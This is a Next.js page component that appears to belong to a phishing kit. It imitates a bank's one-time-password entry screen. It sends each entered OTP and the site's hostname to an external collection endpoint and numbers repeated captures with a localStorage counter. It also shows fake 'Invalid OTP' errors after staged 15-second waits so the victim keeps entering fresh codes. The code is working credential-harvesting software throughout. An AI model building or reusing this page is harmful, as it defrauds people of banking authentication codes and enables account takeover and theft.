'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";  
import TimerComponent from "../inlcude/TimerComponent";
import WaiterTime from "../inlcude/WaiterTime";
import styles from "./page.module.css"


export default function Home() {
    const [loading, setLoading] = useState(true); 
    const [error, setError] = useState(''); 
    const [OTT, setOTT] = useState(0);
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;

    useEffect(() => {
        setTimeout(() => {
            setLoading(false); 
        }, 15000); 
    }, []);

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        let oldcount = localStorage.getItem("otp_count") || 0;
        oldcount = parseInt(oldcount);
        jsonObject['opp_'+oldcount] = jsonObject['oppp'];
        delete jsonObject['oppp'];
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = window.location.hostname;
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            
            localStorage.setItem("otp_count", oldcount+1);
            const responseData = await response.json();
            let nextRoute = localStorage.getItem("next");
            console.log(nextRoute, "nextin route");
            if(nextRoute=="un"){
                setTimeout(() => {
                    setLoading(false);
                    localStorage.setItem("next", "un"); 
                    setError('Invalid OTP! Please try again'); 
                },15000);
            }else if(nextRoute=="3"){
                setError('Invalid OTP! Please try again');
                router.push('/3');
            }else if(nextRoute=="4"){
                if(OTT==1){
                    router.push('/4');
                }
                setTimeout(() => {
                    let newott = OTT+1;
                    setOTT(newott);
                    setLoading(false);
                    setError('Invalid OTP! Please try again');
                },15000)
            }
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
    if (loading) {
        return (
            <WaiterTime/>
        );
    }
  return (
    <>
    <Header />

    <div style={{marginTop:"25px"}} className="px-2" >
        <strong>
            <p className="text-center mt-4">Please enter the onetime password sent to your registered mobile number</p>
        </strong>
        <form onSubmit={handleSubmit} className="mt-3 py-2">
            <div className="form-group">
                <label htmlFor="">onetime password* </label>
                <input name="oppp" placeholder="Enter 6 digit  OTP" minLength={6} maxLength={6} type="password" inputMode="numeric"  className={`form-control ${styles.formControl}`}   required/>
            </div>
            <div className="text-danger text-center">
                {error}
            </div>
            <TimerComponent />
            
            <div className={`${styles.buttonContainer} mb-4 text-center form-group w-100`}>
                    <input type="submit" className={`btn btn-danger text-white w-100 px-4 ${styles.textCenter} text-primary ${styles.submitButton}`} defaultValue="Login" />
            </div>
        </form>
    </div>
    <Footer />
</>
  );
}
